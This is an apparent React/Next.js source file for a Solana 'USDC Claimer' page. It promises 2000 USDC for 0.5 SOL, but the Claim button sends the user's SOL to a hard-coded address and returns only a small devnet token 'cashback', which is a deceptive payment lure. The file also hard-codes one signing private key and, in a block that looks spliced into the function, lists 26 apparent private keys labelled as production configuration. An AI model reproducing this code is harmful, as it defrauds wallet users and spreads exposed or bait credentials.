/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4M7weeBKB72RyTmch1zAkGwipiB3e2hmo3jNXkoHn2GKFKsm4g4hWoJxiecTD2bqHesLBfjYyaEBcvG99rL56AJK"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2QqEguaGU1DDmtT8SBh1WyXFAvjZTvjHKQJVjyQnRShvQqMb927pRVo6oEWtjfFK5QRkYe2YZGwXKuufoMgNosJw",
  "key1": "4rVUaiYdNQfue8tpAht9DYvoa4k8P99NYsHmKTmMzUD7jWhxbYKzAr9iNr4E1SQrAvee3MNY4jYQTrRtWv6opWJo",
  "key2": "2zEG85FuBnsPUaffTwHcJVSrbxMsVEeTYnoBM2pdRkmNcBEPyqesEev7o54QEPztnaE15CGP6NG5jtMpedtbwGgw",
  "key3": "2UAB5rusqL9r5RTzcuSyH2bmzgi5gTTsWh8nUzr2uWPbNCKo4ncUdpWZaPizuwxVEVHx3eNdX6q5VMnje8tzbWEn",
  "key4": "2HMXcpKg2PXVd7ptakdxymWPs8SSYnWdZJ3WLM59uKVbqNagqi3qPhqXtBYzNUowZmzFhBeZ7nqwvKCbH4HBv2Yq",
  "key5": "5keVWXFA92ZXLzAeuexckfBvozBXC7C23sCwCr8bfR1ZJeHKQScV87Hx3Y8b19EUvohvoJhpJhqXn6ecWGxYTbuA",
  "key6": "4b1y4qFUuYGD5nVz3JRce5UPFWXhCUJEK2vXFedX6smGijhrgDbSZLAQVR7W51hqj8aQJrvRR3Z5Pdt39QZoRxwg",
  "key7": "5KQiZ8pCNyRZnBkryYyhb7w4K7AXs4A1tHyj6fGRmjW89f9oYQJfGjucaTJu2ZavkXUNUUMYdTwEkiTWdJwYdQDQ",
  "key8": "5GJqHjWFsqrwkRFib6rTkf4ncD25KKd3mpviMApXtjfyCZFtbYA82e9eECtYVtw2owiKqN4gJ2k6aoUvQe9avJBn",
  "key9": "2B3jQgaByKm8miNPdhVHgbgJ92mJNaaBpmwXWoJ2G3bLGNjsbABPzmo5Vv2cQ7uzvKZP1yFzJxh54mi4e459dVsv",
  "key10": "s4ycgacTDKjXMHMtfNDMk9hmvh3YLcDHPkbhzjNgtZCySTBYCchtfsCCzA9w8oUsMU8UPs3jHRFL6tARRL1z8Nb",
  "key11": "2H74SKGoTRqmdvXXJGqS9wLjJ7xncJrFyoF7egf46sHdLmeVGd97YwJXbuAmZQcLBsqwCr1u97Xwyf8dVBv2LFca",
  "key12": "5JUbN7ZKwPfd2zARdHqqxu8kdqv7CX2e7oMUwnY2Mx4F7jCwRs9ey8wcpNuLmRgfAnmrPj3GYDZMFEfj8j41d1Bg",
  "key13": "4E3tHTw4dS1TnSxPe6dwhxY5iwHXUndQwycvGo41a6WAud8JiCMNBQdo1dyWUr231wr1d3eQZSyqvpEycwS1im3C",
  "key14": "3Q9eXuXzNH7NzbyW2faGvFFzDDgiczkUbnAWUZPNuALycXaJ5bJYE6QfZyRtKbzTaBgd3s59gTyitBmCCDb7xzRe",
  "key15": "468Z1uLRY1RaQwWcyXvN3HawB1BWt4AKzRVHFDBHxwjZq5JD9ibxBoKdoCYFBEPifUaScC27yAmQm9NMB3qG8ZK9",
  "key16": "36pEvvfCVkCbjEfVPQeCvSSW6rdoy1uLWvLHZiPMFGUWkoUbZko1kZkx3zbS7ugr1u3Ab4C8eJhHC4RrzZztt7k4",
  "key17": "3MuMtDz6yGKwaGNuThDaTj8sQwvDxp1UApGW3971nEZzPe5CJBtFmWaanV9AMUNbKftTEV9Z5eJCN7n5MqXLyZru",
  "key18": "3LfsCUUuWXVbB8KChVi4eZZNBVpv2Un5YawioYEw7Kgu8KBz6guW3SUeTthcYzbWJACXv8NBJeCmfQPajiSbmnQq",
  "key19": "4ycjudDw9w9ZjRv1Uibbv99Gf31YtdTUc1xtUcUgDCQoutm9UUqaPsJZJgcJ9yDuWqtkCBA6Lv4iRngoyCsKzzt8",
  "key20": "2PA46vibUReVXboP16RnezCyix5yVSP5hvdYPUSaGa4njYUA81VaLWoWQSe8gurEFt9ZAoutmx21cqr5EMjCUF5j",
  "key21": "54QoBsmuNBu78E2EaZgAURGaJNdve3F8yf2EPuYMY3mgqFHjzufXEUu7PeLa3vBsGawqPGVze6d9sbVdVCfKSPAF",
  "key22": "2mBC4mYoNz3PGXSDjjqR96jGaLB8Pgn9dzZjBufhkfYhVhLmL2HVurF4wiuYGMkPGPrS1Z8pF6eu3BMp3b326hjC",
  "key23": "4v5pfZyanKjbUphdaqjRQA6QxwfXMWU4p38DUkszNFMoxKnY4RkS1Pb9qq1uCEps3QaA4TicB4rwAmaPSiNVbuKg",
  "key24": "5QgtBZMgPNXAnpeugZ9QFArvdUC1AQnZJcHjgo3WEmRzyHxY5NbDzFk1rso2kfeSNbAej1HADVEwU8SFFUXEDduF",
  "key25": "4PQvCj4HcD2tQUn9wVbERkX295jGzdWnzTACQvH347cqZ7mLyUQqv4Xty5yQbr33qQWT3uqeWkHHaqWC8K3xiS9j"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
